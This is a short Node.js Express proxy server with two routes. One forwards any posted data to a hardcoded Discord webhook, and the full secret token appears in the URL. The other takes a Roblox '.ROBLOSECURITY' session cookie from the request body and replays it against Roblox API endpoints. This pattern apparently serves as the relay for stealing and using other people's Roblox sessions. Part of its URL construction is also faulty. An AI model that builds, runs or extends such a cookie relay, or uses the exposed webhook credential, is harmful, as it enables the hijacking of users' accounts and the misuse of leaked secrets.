const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());

// Proxy for Discord webhook
app.post('/webhook', async (req, res) => {
  try {
    const discordUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
    const response = await fetch(discordUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(req.body),
    });
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook forward failed:', response.status, errorText);
      return res.status(response.status).send({ error: errorText });
    }
    res.status(200).send({ success: true });
  } catch (error) {
    console.error('Proxy error:', error.message);
    res.status(500).send({ error: error.message });
  }
});

// Proxy for Roblox API endpoints
app.all('/:endpoint(*)', async (req, res) => {
  try {
    const { endpoint } = req.params;
    const { cookie } = req.body || {};
    const robloxUrl = endpoint.startsWith('/')
      ? `https://roblox.com${endpoint}`
      : `https://${endpoint}.roblox.com/v1${endpoint}`;
    const response = await fetch(robloxUrl, {
      method: req.method,
      headers: {
        'Content-Type': 'application/json',
        ...(cookie && { Cookie: `.ROBLOSECURITY=${cookie}` }),
      },
      body: req.method === 'POST' && cookie ? JSON.stringify({}) : null,
    });
    const data = await response.json();
    if (!response.ok) {
      console.error(`Roblox API failed: ${robloxUrl}`, response.status);
      return res.status(response.status).send({ error: data });
    }
    res.status(200).send(data);
  } catch (error) {
    console.error('Roblox proxy error:', error.message);
    res.status(500).send({ error: error.message });
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Proxy server running');
});
